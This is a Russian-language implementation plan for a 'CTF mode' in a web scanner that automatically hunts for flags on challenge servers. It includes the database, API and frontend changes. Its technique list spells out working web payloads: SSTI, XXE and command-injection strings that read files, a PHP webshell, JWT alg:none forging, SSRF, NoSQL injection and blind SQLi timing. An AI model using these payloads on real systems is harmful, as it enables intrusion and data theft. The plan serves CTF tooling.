# CTF Web Flag Hunter — Полный план реализации

## Архитектура

Новый `scan_type="ctf"` — отдельный пайплайн в `tasks/scan.py`.
Пользователь задаёт кастомный формат флага при создании скана.
Флаги сохраняются как Finding с `type="flag"`, `severity="critical"`.
Отдельная вкладка FLAGS в ScanDetail.

---

## Шаги реализации

### ШАГ 1 — БД: поле ctf_flag_format в модели Scan
**Файл:** `backend/app/models/scan.py`
- Добавить поле `ctf_flag_format: str | None` — хранит кастомный паттерн флага введённый пользователем
- Пример значений: `aues{...}`, `FLAG{...}`, `CTF{...}`, regex строка

**Файл:** `backend/alembic/versions/` — новая миграция
- `ALTER TABLE scans ADD COLUMN ctf_flag_format VARCHAR(200) NULL`

---

### ШАГ 2 — Схемы: добавить ctf тип и ctf_flag_format
**Файл:** `backend/app/schemas/scan.py`
- `ScanTypeT = Literal["full", "port", "vuln", "web", "ctf"]`
- `CreateScanRequest` добавить поле `ctf_flag_format: str | None = None`
- Расширить `_validate_target`: если target начинается с `http://` или `https://` — принимать как есть (CTF цели бывают URL с портом)
- `ScanOut` добавить `ctf_flag_format: str | None = None`

---

### ШАГ 3 — Утилита: flag_extractor.py
**Файл:** `backend/app/scanner/flag_extractor.py`

Функции:
```python
def build_flag_pattern(custom_format: str | None) -> re.Pattern:
    """
    Если custom_format задан — компилируем его как основной паттерн.
    Всегда добавляем стандартные: FLAG{}, CTF{}, HTB{}, THM{}, DUCTF{},
    picoCTF{}, flag{}, и generic [A-Z0-9]{2,10}{...}
    """

def extract_flags(text: str, pattern: re.Pattern) -> list[str]:
    """Ищет все совпадения флага в тексте, возвращает уникальные."""

def search_flags_in_response(
    body: str,
    headers: dict,
    cookies: dict,
    pattern: re.Pattern,
) -> list[str]:
    """Ищет флаги в body + значениях всех headers + значениях cookies."""
```

---

### ШАГ 4 — Главный модуль: ctf_hunter.py
**Файл:** `backend/app/scanner/ctf_hunter.py`

Принимает `ctx, target, scan_type, ctf_flag_format, all_findings`.
Запускает все техники последовательно, каждая возвращает `list[Finding]`.

#### Техника A — Common CTF paths (wordlist probe)
Пути для проверки GET-запросом:
```
/flag, /flag.txt, /flag.php, /secret, /secret.txt, /key, /answer,
/hidden, /.hidden, /admin/flag, /api/flag, /api/secret, /debug,
/console, /backup, /backup.zip, /source.zip, /source, /download,
/robots.txt, /phpinfo.php, /info.php, /test.php, /.env,
/.env.backup, /.env.local, /.env.prod, /config.php, /config.js,
/app.py, /app.py.bak, /index.php.bak, /index.php~, /web.config,
/web.config.bak, *.swp файлы (/.index.php.swp), /dump.sql,
/db.sql, /database.sql, /requirements.txt, /package.json,
/composer.json, /Dockerfile, /docker-compose.yml, /.git/HEAD,
/.git/config, /.git/COMMIT_EDITMSG, /proc/self/environ (через URL)
```
Искать флаги в теле ответа. Если 200 — сохранить finding.

#### Техника B — .git reconstruction
- Скачать `.git/HEAD`, `.git/config`, `.git/index`
- Перебрать `.git/objects/` (pack files + loose objects)
- Реконструировать исходники через `git cat-file`
- Искать флаги во всех файлах

#### Техника C — JWT attack
- Найти JWT в Cookie, Authorization header (Bearer), ответах API
- Декодировать payload (base64)
- Искать флаг прямо в payload
- Атака `alg: none` — убрать подпись, поставить `alg: "none"`
- Брутфорс слабых ключей: `secret`, `password`, `key`, `jwt`, `flag`, `ctf`,
  `admin`, `test`, `123456`, `qwerty`, `letmein`, пустая строка
- Если подобрали ключ — подписать новый payload: `admin: true`, `role: "admin"`,
  `isAdmin: true`, `user_id: 1`, `is_superuser: true`
- Отправить запрос с новым JWT, искать флаг в ответе
- Инструмент: `jwt_tool` если доступен, иначе `python-jose` inline

#### Техника D — IDOR enumeration
- Найти числовые параметры в URL из all_findings: `?id=N`, `/user/N`, `/note/N`,
  `/post/N`, `/item/N`, `/flag/N`, `/challenge/N`
- Перебрать ID 1..100 (или 1..50 для скорости)
- Найти UUID в ответах → попробовать предсказуемые UUID (версия 1 — timestamp based)
- Искать флаги в каждом ответе
- Также пробовать: `/user/0`, `/user/-1`, `/user/99999`, `/user/admin`

#### Техника E — SSTI inline probe (без tplmap)
Векторы: параметры URL, поля форм, заголовки User-Agent/Referer/X-Forwarded-For
Паттерны для Jinja2/Twig/Freemarker/ERB/EL:
```
{{7*7}} → ищем 49
${7*7} → ищем 49
<%= 7*7 %> → ищем 49
#{7*7} → ищем 49
{{7*'7'}} → ищем 7777777 (Jinja2 vs Twig различие)
```
Если SSTI подтверждён → попробовать чтение файла:
- Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('cat /flag.txt').read()}}`
- Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag.txt")}}`
- Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}`
- ERB: `<%= `cat /flag.txt` %>`
Искать флаг в ответе.

#### Техника F — XXE
Найти XML-принимающие endpoints (из all_findings: content-type application/xml, SOAP, файловые upload)
Payloads:
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/flag">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/flag">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/flag.txt">]>
```
Blind XXE: OOB через `http://attacker` (пропускаем для CTF — нет внешнего сервера)

#### Техника G — SSRF probe
Параметры URL содержащие `url=`, `src=`, `dest=`, `redirect=`, `path=`, `uri=`, `link=`
Payloads:
```
file:///flag.txt
file:///etc/flag
file:///var/www/html/flag.txt
file:///app/flag.txt
dict://127.0.0.1:22/
```
Искать флаг в ответе.

#### Техника H — Command injection inline probe
Параметры форм и URL без внешних инструментов:
```
; cat /flag.txt
| cat /flag.txt
`cat /flag.txt`
$(cat /flag.txt)
; cat /flag
&& cat /flag.txt
%0a cat /flag.txt
```
В заголовках: User-Agent, X-Forwarded-For, Referer
Искать флаг в ответе.

#### Техника I — NoSQL injection (MongoDB)
JSON body с операторами:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.password.match(/flag/)"}
```
URL параметры: `?filter[$gt]=`, `?user[$ne]=null`
Искать флаги в ответах (login bypass → данные пользователя с флагом)

#### Техника J — GraphQL introspection
Endpoint пробы: `/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`, `/query`
Запросы:
```graphql
{__schema{types{name fields{name}}}}
{__type(name:"Query"){fields{name}}}
```
Искать в схеме поля с именами: `flag`, `secret`, `key`, `token`, `password`
Выполнить запрос для этих полей, искать флаги в ответе
Попробовать mutation если есть, попробовать batching атаку

#### Техника K — File upload → RCE
Найти файловые upload формы (из all_findings или методом probe)
Попробовать загрузить:
- PHP webshell: `<?php system($_GET['cmd']); ?>`
- Python: `.py` файл если приложение Python
- Обходы фильтрации: `.php5`, `.phtml`, `.pHp`, `shell.php.jpg`, MIME type подмена
Если загрузка прошла — найти путь загрузки, выполнить `cat /flag.txt`
Искать флаг в ответе.

#### Техника L — Mass assignment / parameter pollution
POST/PUT запросы с дополнительными полями:
```json
{"username": "user", "password": "pass", "isAdmin": true, "role": "admin", "is_superuser": true}
```
HTTP Parameter Pollution: `?id=1&id=0`, `?admin=false&admin=true`
Искать флаг или admin-контент в ответе.

#### Техника M — Path normalization bypass
Если есть `/admin` (403) — попробовать:
```
/admin/../admin/
/./admin/
//admin/
/admin/.
/%2fadmin/
/admin%2f
/Admin/, /ADMIN/
/admin;/
/admin?
/api/v1/../admin/
```
Искать флаг или защищённый контент.

#### Техника N — Nginx/Apache misconfig
```
/static../etc/passwd
/files/../../../../etc/flag
/uploads/../flag.txt
/assets/%2e%2e%2fetc%2fflag
```

#### Техника O — Flask/Django debug pages
Пробы: `/console` (Werkzeug), `?debug=1`, `?__debug__=1`, `/_debug_toolbar/`
Werkzeug console: попробовать RCE через `import os; os.popen('cat /flag.txt').read()`
Django: `/admin/` дефолтные creds (`admin:admin`, `admin:password`, `admin:admin123`)

#### Техника P — Type juggling (PHP magic)
Для PHP приложений — логин с magic hashes:
```
password=0
password=0e215962017
password[]=anything  (array bypass)
username=admin&password[]=
```

#### Техника Q — Cookie/Header manipulation
Отправить запросы с изменёнными Cookie:
```
Cookie: admin=true; role=admin; isAdmin=1; user=admin; auth=true
```
Кастомные заголовки:
```
X-Admin: true
X-Role: admin
X-User: admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```
Искать флаг в ответе.

#### Техника R — Error pages / stack traces
Специально вызвать ошибки:
- Невалидные параметры: `?id=', ?id=<script>, ?id=../`
- Несуществующие маршруты с разными методами (PUT, PATCH, DELETE на `/flag`)
- Content-Type подмена: отправить XML вместо JSON
- Искать флаг в stack trace, error message, debug info

#### Техника S — WebSocket probe
Если нашли WebSocket (`ws://`, `wss://` в JS source или upgrade headers)
Подключиться, отправить: `{"type":"flag"}`, `{"action":"getFlag"}`, `{"cmd":"flag"}`, `"flag"`
Искать флаг в ответах.
Инструмент: `websocat` если доступен, иначе Python `websockets` inline.

#### Техника T — Prototype pollution (JS apps)
Для Node.js/Express приложений:
```
?__proto__[admin]=true
?constructor[prototype][admin]=true
POST body: {"__proto__": {"admin": true}}
```

#### Техника U — JSONP hijacking
Найти endpoints с `callback=` параметром
Попробовать: `?callback=flag_leak`
Искать флаг в JSONP ответе.

#### Техника V — CRLF injection
В параметры: `%0d%0aX-Flag: test`
В заголовки User-Agent, Referer
Смотреть response headers на отражение.

#### Техника W — Deserialization probes
PHP: `O:4:"Flag":1:{s:4:"flag";s:20:"flag_value_here";}` — попробовать десериализацию
Python pickle: `base64(pickle.dumps(os.system('cat /flag.txt')))`
Java: ysoserial payloads (если инструмент доступен)
Смотреть на 500 ошибки с интересными stack traces.

#### Техника X — Timing / Blind oracle
Blind SQL: `' AND SLEEP(3)--` → если задержка ≥ 3s — уязвим
Blind flag extraction через timing: `' AND IF(SUBSTR(flag,1,1)='F', SLEEP(2), 0)--`
(Только если SQLi не дал результата прямым методом)

#### Техника Y — Race condition
На endpoint покупки/списания/одноразовых токенов:
10 параллельных запросов через `asyncio.gather`
Искать флаг или аномальный ответ.

#### Техника Z — CSS injection (если есть стиль-input)
`input[value^="F"]{background:url(http://...)}` — пропускаем (нет OOB).
Вместо этого: искать флаг через reflection: `<style>@import 'data:...'</style>`.

---

### ШАГ 5 — Интеграция extract_flags во все web-модули
**Файлы:** `lfi.py`, `web_vulns.py`, `sqlmap.py`, `xss.py`, `dirscan.py`, `nikto.py`

В каждом модуле: после получения HTTP-ответа вызывать `extract_flags(body, pattern)`.
Если флаг найден — создать Finding `type="flag"` дополнительно к обычному finding.
Паттерн строится из `ctx.scan.ctf_flag_format` при `scan_type == "ctf"`.

---

### ШАГ 6 — Пайплайн: CTF ветка в tasks/scan.py
**Файл:** `backend/app/tasks/scan.py`

Добавить ветку `if scan.scan_type == "ctf":` после всех обычных веток.
CTF пайплайн:
```
Phase 0:  dns_recon (облегчённый, без deep enum)
Phase 1:  nmap (только порты 80,443,8080,8443,3000,5000,4000,9000,1337)
Phase 2:  web_scan (nikto — быстрый режим)
Phase 2b: ssl_headers
Phase 2c: dir_scan (CTF wordlist)
Phase 2d: sqli_scan (+ flag extraction)
Phase 2e: xss_scan (+ flag extraction)
Phase 2f: lfi_scan (+ flag extraction)
Phase 2g: web_vulns (+ flag extraction)
Phase 3:  ctf_hunt (главный модуль — все A-Y техники)
Phase 4:  rule_engine (упрощённый)
```
Передавать `ctf_flag_format` в ctf_hunter и все web-модули.

---

### ШАГ 7 — API: передача ctf_flag_format
**Файл:** `backend/app/api/v1/routers/scans.py`

В `create_scan` сохранять `ctf_flag_format` в объект Scan.
В `_enrich` добавить `ctf_flag_format` в ScanOut.

---

### ШАГ 8 — Frontend: CTF форма создания скана
**Файл:** `frontend/src/pages/Dashboard.tsx`

- Добавить `<option value="ctf">⚑ CTF Mode</option>` в select
- Если `scanType === "ctf"` — показать дополнительное поле:
  ```
  Flag format: [aues{...}         ] (placeholder)
  Hint: e.g. FLAG{...}, aues{...}, или regex
  ```
- Изменить placeholder target поля для CTF: "IP, domain, or http://host:port"
- Добавить `ctf_flag_format` в `scansApi.create()` вызов
- Бейдж `⚑ CTF` на карточках сканов в списке

---

### ШАГ 9 — Frontend: FLAGS вкладка в ScanDetail
**Файл:** `frontend/src/pages/ScanDetail.tsx`

- Новая вкладка "FLAGS" — показывать если `scan_type === 'ctf'` ИЛИ есть findings с `type === 'flag'`
- Вкладка идёт первой если флаги найдены
- Каждый флаг — большая карточка: жёлтый/золотой цвет, `font-mono text-lg`, кнопка Copy
- Если флагов нет — пустое состояние "No flags captured yet"
- Pulse анимация на карточке флага
- Добавить CTF фазы в labels прогресс-бара:
  ```
  ctf_hunt → "CTF Flag Hunt"
  jwt_crack → "JWT Attack"  
  idor_scan → "IDOR Enumeration"
  source_leak → "Source Leak"
  graphql → "GraphQL Probe"
  ```

---

### ШАГ 10 — Frontend: API типы
**Файл:** `frontend/src/lib/api.ts`

- Добавить `ctf_flag_format?: string` в `CreateScanRequest` тип
- Добавить `ctf_flag_format?: string` в `Scan` тип

---

## Порядок выполнения (строго последовательно)

```
1. models/scan.py          — поле ctf_flag_format
2. alembic migration       — ALTER TABLE
3. schemas/scan.py         — ctf тип + поле + URL target
4. flag_extractor.py       — утилита (NEW FILE)
5. ctf_hunter.py           — главный модуль (NEW FILE) [техники A-Y]
6. lfi.py                  — добавить extract_flags
7. web_vulns.py            — добавить extract_flags
8. sqlmap.py               — добавить extract_flags
9. xss.py                  — добавить extract_flags
10. dirscan.py             — добавить extract_flags
11. tasks/scan.py          — CTF ветка пайплайна
12. routers/scans.py       — ctf_flag_format в create/enrich
13. frontend/src/lib/api.ts        — типы
14. frontend/Dashboard.tsx         — CTF форма
15. frontend/ScanDetail.tsx        — FLAGS вкладка
```

## Что НЕ реализуем

- CSS injection OOB (нет внешнего сервера для приёма)
- Blind OOB XXE (аналогично)
- Java deserialization (нет ysoserial в образе)
- Полный git reconstruct через pack files (слишком сложно, делаем HEAD+config+COMMIT_EDITMSG)

---

## Ожидаемый результат

Пользователь вводит `http://challenge.aues.kz:5000`, выбирает **CTF**, вводит формат `aues{...}`,
нажимает Launch. Система прогоняет 25 техник поиска флага, найденные флаги появляются
в выделенной вкладке FLAGS крупным шрифтом с кнопкой Copy.
